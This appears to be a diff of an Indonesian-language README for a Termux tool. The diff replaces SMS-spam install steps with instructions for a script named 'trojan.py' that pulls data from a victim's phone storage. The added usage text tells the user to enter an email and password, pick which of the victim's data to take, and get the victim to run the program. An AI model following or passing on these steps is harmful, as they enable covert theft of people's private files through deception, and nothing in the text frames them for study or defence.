@@ -9,9 +9,11 @@ Program Dibuat Untuk Mengambil Data Di penyimpanan internal korban
 
 ```
 
-Inggris :
+Cara Penggunaan :
 
-This Code Is Made To Judge Your Friends Who Are Playing The Game 🤣
+Masukan alamat email anda beserta passwordnya (saya sarankan pakai email cadangan saja)
+lalu isi nama file untuk program tersebut selanjutnya isi nama data yang ingin anda ambil
+di hp korban dan suruh korban menjalankan program tersebut
 
 ```
 
@@ -23,33 +25,21 @@ Termux :
 
 $ pkg install git
 
-$ pkg install python2
+$ pkg install python3
 
-$ pip2 install requests
+$ pip install marshal
 
-$ pip2 install mechanize
+$ pkg install zip
 
-$ git clone https://github.com/Fukur0-3XP/SpamSms
+$ git clone https://github.com/Hagirs19/sv
 
-$ cd SpamSms
+$ cd sv
 
-$ python2 Spam.py
+$ python3 trojan.py
 
 Kali Linux :
 
-$ sudo apt-get install git
-
-$ sudo apt install python-pip
-
-$ pip2 install mechanize
-
-$ pip2 install requests
-
-$ git clone https://github.com/Fukur0-3XP/SpamSms
-
-$ cd SpamSms
-
-$ python2 Spam.py
+$ Coming Soon
 
 ```
 
@@ -57,12 +47,10 @@ $ python2 Spam.py
 
 ```
 
-Creator : ./FUKUR0-3XP
+Creator : Hagirs
 
-Team : Black Coders Anonymous Satanic Exploiter Team
+Team : R3XD
 
-Instagram : ricko.3xp_
-
-Email : 3xp.fukur0@gmail.com
+Instagram : @Hagi.rs
 
 ```
